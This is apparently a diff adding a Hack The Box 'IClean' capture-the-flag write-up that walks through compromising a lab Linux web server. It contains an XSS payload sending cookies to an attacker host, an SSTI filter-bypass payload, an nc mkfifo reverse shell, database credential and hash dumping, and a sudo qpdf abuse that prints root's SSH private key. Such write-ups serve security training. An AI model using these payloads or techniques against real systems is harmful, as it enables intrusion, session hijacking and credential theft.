@@ -1,0 +1,419 @@
+---
+title: HackTheBox IClean
+description: Writeup
+---
+## Hack The Box iClean Writeup
+<img src="https://i.ytimg.com/vi/bAIXVgSu2cM/maxresdefault.jpg" />
+
+## Overview
+- **Machine Name:** IClean
+- **OS:** Linux
+- **Difficulty:** Medium
+## Exploitation Summary:
+
+1. **XSS Exploitation:** 
+   - Exploited an XSS vulnerability to gain access to the /dashboard directory.
+3. **SSTI to RCE:** 
+   - Exploited a Server-Side Template Injection (SSTI) vulnerability on the /QRGenerator endpoint to achieve Remote Code Execution (RCE).
+   - Bypassed filters to execute arbitrary commands on the target system.
+## Reconnaissance
+### Nmap Scan Results
+
+```java
+# Nmap 7.94SVN scan initiated Sun Apr  7 01:06:41 2024 as: nmap -sCV --min-rate=5000 -Pn -vvv -oN fullscan_report 10.129.57.94
+Nmap scan report for 10.129.57.94
+Host is up, received user-set (0.063s latency).
+Scanned at 2024-04-07 01:06:41 CEST for 22s
+Not shown: 993 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE         REASON      VERSION
+22/tcp    open     ssh             syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
+|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
+80/tcp    open     http            syn-ack     Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+548/tcp   filtered afp             no-response
+705/tcp   filtered agentx          no-response
+1761/tcp  filtered landesk-rc      no-response
+26214/tcp filtered unknown         no-response
+32776/tcp filtered sometimes-rpc15 no-response
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr  7 01:07:03 2024 -- 1 IP address (1 host up) scanned in 22.45 seconds
+```
+### Directory Enumeration
+We have discovered an interesting directory: /dashboard. This suggests that we might need to perform a web-based attack to gain access to this directory.
+```java
+[+] Fuzzing with Gobuster URL: http://capiclean.htb/ [+]
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://capiclean.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 5267]
+/login                (Status: 200) [Size: 2106]
+/services             (Status: 200) [Size: 8592]
+/team                 (Status: 200) [Size: 8109]
+/quote                (Status: 200) [Size: 2237]
+/logout               (Status: 302) [Size: 189] [--> /]
+/dashboard            (Status: 302) [Size: 189] [--> /]
+/choose               (Status: 200) [Size: 6084]
+```
+## Exploitation
+### Vulnerabilities Exploited
+
+The XSS payload used to exploit the vulnerability is as follows:
+```java
+<img+src%3dx+onerror%3dthis.src%3d"http%3a//<IP>/"%2bbtoa(document.cookie)>
+```
+### Exploitation Steps
+1. **Intercepting the Request:**
+    - Intercept a request using BurpSuite in `http://capiclean.htb/quote`.
+```python
+POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Length: 93
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://capiclean.htb/quote
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+service=Carpet+Cleaning&service=Tile+%26+Grout&service=Office+Cleaning&email=test%40email.com
+```
+
+2. **Sending XSS Payload:**
+    - Send an XSS payload via the request to receive the cookie.
+```python
+POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Length: 159
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://capiclean.htb/quote
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img+src%3dx+onerror%3dthis.src%3d"http%3a//10.10.16.X/"%2bbtoa(document.cookie)>&email=test%40email.com
+```
+
+3. **Receiving and Decoding the Cookie:**
+    - Set up a Python server to receive the cookie.
+    - Decode the received base64 encoded cookie.
+```java
+[+] Serving files from /home/syztem4our666 [+]
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.71.9 - - [07/Apr/2024 15:06:58] code 404, message File not found
+10.129.71.9 - - [07/Apr/2024 15:06:58] "GET /c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSEU0US5yUTBwZm9uVUZHVElaZUhLVldNNTlsUDl5MW8=
+```
+
+Decoded we can see is a JSON web token, then paste it on cookies storage 
+```java
+session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
+```
+
+4. **Exploiting Server-Side Template Injection (SSTI) on `/QRGenerator`:**
+    - Exploit SSTI vulnerability by injecting Python code via `{{}}` syntax.
+    - Attempt to execute arbitrary commands such as `id` to verify vulnerability.
+```python
+POST /QRGenerator HTTP/1.1
+Host: capiclean.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://capiclean.htb
+Connection: close
+Referer: http://capiclean.htb/QRGenerator
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
+Upgrade-Insecure-Requests: 1
+
+invoice_id=&form_type=scannable_invoice&qr_link={{7*7}}
+```
+
+And we get this on the final part of the response:
+```java
+<div class="qr-code-container"><div class="qr-code"><img src="data:image/png;base64,49" alt="QR Code"></div>
+</body>
+</html>
+```
+
+5. **Exploiting SSTI to Remote Code Execution (RCE):**
+    - Escalate SSTI vulnerability to execute arbitrary commands, aiming for RCE.
+    - Use payload to execute commands like `os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f')`.
+```python
+POST /QRGenerator HTTP/1.1
+Host: capiclean.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://capiclean.htb
+Connection: close
+Referer: http://capiclean.htb/QRGenerator
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhHE4Q.rQ0pfonUFGTIZeHKVWM59lP9y1o
+Upgrade-Insecure-Requests: 1
+
+invoice_id=&form_type=scannable_invoice&qr_link={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+```java
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f')|attr('read')()}}
+```
+
+URL encode the reverse shell.
+```java
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<IP>%204444%20%3E%2Ftmp%2Ff
+```
+And we get a shell as www-data
+```java
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.X] from (UNKNOWN) [10.129.71.9] 36524
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+```
+Stabilize the shell 
+```java
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+## Post-Exploitation
+### Privilege Escalation for user consuela
+After gaining access to the system as `www-data`, we discovered a Python script (`app.py`) containing sensitive information such as database credentials:
+```java
+secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
+app.secret_key = secret_key
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+```
+After successful authentication, you'll see the MySQL prompt:
+```java
+www-data@iclean:/opt/app$ mysql -u iclean -p capiclean
+mysql -u iclean -p capiclean
+Enter password: pxCsmnGLckUb
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3000
+Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+```
+Using these credentials, we accessed the MySQL database and enumerated the tables:
+```java
+mysql> SHOW TABLES;
+SHOW TABLES;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.01 sec)
+
+mysql> 
+```
+This MySQL query retrieves all records from the `users` table, displaying the `id`, `username` & hashed `passwords` 
+```java
+mysql> SELECT * FROM users;
+SELECT * FROM users;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+```
+The attempt to crack Consuela's password hash was successful, revealing the password as "simple and clean". With this password, we successfully logged in as Consuela via SSH:
+```java
+|Hash|Type|Result|
+|---|---|---|
+|0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa  <br>ee11cbb19052e40b07aac0ca060c23ee|sha256|simple and clean|
+```
+
+```java
+ssh consuela@10.129.71.9
+```
+
+After entering the password, we were able to access the system as Consuela:
+
+```java
+ssh consuela@10.129.71.9            
+The authenticity of host '10.129.71.9 (10.129.71.9)' can't be established.
+ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.71.9' (ED25519) to the list of known hosts.
+consuela@10.129.71.9's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+consuela@iclean:~$ whoami
+consuela
+```
+
+### Privilege Escalation for root
+
+- Obtained SSH private key for `root` user by exploiting `qpdf` vulnerability.
+- Authenticated as `root` using the obtained SSH private key.
+- Escalated privileges to `root` and accessed `root` directory, confirming successful compromise.
+We then checked Consuela's sudo privileges using the `sudo -l` command:
+
+```java
+consuela@iclean:~$ sudo -l
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+```
+
+Here are the steps outlined in the improved markdown writeup:
+
+1. **Generate PDF with SSH Private Key Attachment**:
+    
+    - Run `sudo /usr/bin/qpdf --empty /tmp/juicy.pdf --qdf --add-attachment /root/.ssh/id_rsa --` to generate a PDF file (`juicy.pdf`) with the SSH private key attached.
+
+Consuela has sudo privileges to run `/usr/bin/qpdf` without providing a password. This could be an opportunity for privilege escalation.
+
+While trying to get the right command, i came with this command successfully getting "id_rsa" for root.
+
+The command `sudo /usr/bin/qpdf --empty /tmp/lol.pdf --qdf --add-attachment /root/.ssh/id_rsa --` is attempting to exploit the `qpdf` utility to add an attachment to a PDF file in order to retrieve the `id_rsa` file, which is often the private SSH key for the `root` user. Let's break down the command:
+
+`sudo`: This command is used to execute subsequent commands with superuser (root) privileges.
+    
+`/usr/bin/qpdf`: This is the path to the `qpdf` utility, a command-line program used to manipulate PDF files.
+    
+`--empty /tmp/lol.pdf`: This argument specifies that a new, empty PDF file named `lol.pdf` will be created in the `/tmp` directory.
+    
+`--qdf`: This argument specifies that the output PDF file should be in QDF (QDF is a format used by QPDF for representing PDF content).
+    
+`--add-attachment /root/.ssh/id_rsa`: This argument tells `qpdf` to add an attachment to the PDF file. The attachment being added is the `id_rsa` file located in the `/root/.ssh/` directory.
+    
+`--`: This double hyphen (`--`) signifies the end of command-line options. Anything after this is interpreted as an argument rather than an option.
+    
+
+So, in summary, this command is creating a new PDF file in the `/tmp` directory and attaching the `id_rsa` file (private SSH key for the `root` user) to it using the `qpdf` utility. The exploitation relies on the assumption that `qpdf` is configured to run with elevated privileges via `sudo`, allowing it to access sensitive files such as the `id_rsa` file.
+
+```java
+consuela@iclean:~$ sudo /usr/bin/qpdf --empty /tmp/juicy.pdf --qdf --add-attachment /root/.ssh/id_rsa --
+consuela@iclean:~$ cd /tmp
+consuela@iclean:/tmp$ ls
+f
+juicy.pdf
+```
+
+Use `cat juicy.pdf` to display the contents of the PDF file, which includes the SSH private key.
+
+```java
+cat juicy.pdf
+```
+
+```java
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
+vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
+dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
+JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
+EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
+AgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+```java
+nano id_rsa   
+```
+
+```java
+chmod 600 id_rsa
+```
+Use the SSH private key to authenticate as the root user on the target server with `ssh -i id_rsa root@10.129.71.9`
+```java
+ssh -i id_rsa root@10.129.71.9
+```
+And we are root, get root flag.txt
+```java
+ ssh -i id_rsa root@10.129.71.9            
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sun Apr  7 02:29:20 PM UTC 2024
+
+
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+3 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@iclean:~# whoami
+root
+root@iclean:~# 
+```
+
+---
+
